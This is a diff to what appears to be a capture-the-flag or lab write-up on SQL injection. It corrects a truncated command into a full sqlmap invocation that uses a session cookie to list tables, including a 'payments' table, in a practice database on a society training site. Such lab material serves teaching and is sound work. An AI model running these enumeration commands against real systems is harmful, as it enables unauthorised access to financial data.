@@ -161,7 +161,7 @@ available databases [3]:
 
 From the output above, you could see that the database being used is __geordie_boat_rentals_ltd__.
 
-You could also see that the database contained a table called `payments`, related to financial information, by running the command `https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd --tables`. This would return:
+You could also see that the database contained a table called `payments`, related to financial information, by running the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd --tables`. This would return:
 ```
 Database: geordie_boat_rentals_ltd
 [2 tables]
